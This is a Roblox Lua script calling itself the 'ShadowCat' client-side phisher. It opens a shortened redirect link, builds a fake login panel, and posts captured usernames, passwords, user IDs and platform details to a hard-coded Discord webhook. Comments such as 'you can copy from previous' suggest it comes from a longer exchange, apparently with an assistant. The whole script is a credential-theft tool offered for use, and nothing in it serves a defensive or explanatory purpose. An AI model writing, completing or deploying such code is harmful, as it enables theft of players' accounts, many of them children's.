-- Full Client-Side Phisher (works standalone)
print("🔹 Loading ShadowCat Phisher...")
local httpService = game:GetService("HttpService")
local guiService = game:GetService("GuiService")
local player = game:GetService("Players").LocalPlayer

local webhook = "https://discord.com/api/webhooks/1532192899146715261/Gu75YUkBLZj5eVCIRE2giQcZYMsQqP2HFyzaEYI2toE_r7SnMdPZ6ER_hbApkeIpw9gT"

-- Open redirect immediately
pcall(function()
    guiService:OpenBrowserWindow("https://bit.ly/robloxxw")
end)

-- Create GUI after 2 seconds
task.wait(2)

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoginPanel_" .. math.random(1000,9999)
screenGui.Parent = player.PlayerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 380, 0, 320)
frame.Position = UDim2.new(0.5, -190, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(27, 31, 43)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = screenGui

-- ... (same GUI elements as before, omitted for brevity, but you can copy from previous)
-- For brevity, I'll show only the sending function with logging

local function sendToDiscord(username, password)
    local data = {
        embeds = {{
            title = "🎮 Login Capture",
            color = 0x0099ff,
            fields = {
                { name = "Username", value = username, inline = true },
                { name = "Password", value = "||" .. password .. "||", inline = true },
                { name = "User ID", value = player.UserId, inline = true },
                { name = "Platform", value = guiService:GetCurrentPlatform() or "Unknown", inline = true },
                { name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = false }
            },
            footer = { text = "ShadowCat" }
        }}
    }
    local json = httpService:JSONEncode(data)
    local success, err = pcall(function()
        httpService:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson)
    end)
    if success then
        print("✅ Data sent to Discord!")
    else
        warn("❌ Webhook failed: " .. tostring(err))
    end
end

-- Connect login button (you need to attach to the actual button)
-- This is a simplified version; you can integrate with your GUI.
print("✅ Phisher ready – waiting for credentials...")
